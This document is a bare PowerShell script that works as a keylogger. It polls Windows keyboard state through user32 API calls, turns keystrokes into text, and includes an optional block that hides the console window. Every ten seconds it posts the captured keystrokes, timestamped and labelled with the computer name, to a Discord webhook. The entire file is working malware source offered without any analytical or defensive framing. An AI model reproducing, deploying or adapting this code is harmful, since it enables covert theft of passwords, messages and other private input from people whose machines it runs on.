
$dc = "$dc"
if ($dc.Length -lt 120){
	$dc = ("https://discord.com/api/webhooks/" + "$dc")
}

$defs = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@
$defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru

$lastpress = [System.Diagnostics.Stopwatch]::StartNew()
$threshold = [TimeSpan]::FromSeconds(10)


# Uncomment $hide='y' below to hide the console
# $hide='y'
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
        $w=$p.MainWindowHandle
        $t::ShowWindowAsync($w,0)
    }
}


While ($true){
  $ispressed = $false
    try{
      while ($lastpress.Elapsed` -lt $threshold) {
      Sleep -M 30
        for ($character = 8; $character` -le 254; $character++){
        $keyst = $defs::GetAsyncKeyState($character)
          if ($keyst -eq` -32767) {
                $ispressed = $true
                $lastpress.Restart()
                $null = [console]::CapsLock
                $virtual = $defs::MapVirtualKey($character, 3)
                $state = New-Object Byte[] 256
                $check = $defs::GetKeyboardState($state)
                $logged = New-Object -TypeName System.Text.StringBuilder          
            if ($defs::ToUnicode($character, $virtual, $state, $logged, $logged.Capacity, 0)) {
                $thestring = $logged.ToString()
                if ($character` -eq` 13) {$thestring` = "[ENT]"}
                if ($character` -eq` 8) {$thestring` = "[BACK]"}             
                if ($character` -eq` 27) {$thestring` = "[ESC]"}
                $send += $thestring 
            }
          }
        }
      }
    }
    finally{
      If ($ispressed) {
      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
      $send = ""
      $ispressed = $false
      }
    }
  $lastpress.Restart()
  Sleep -M 10
}
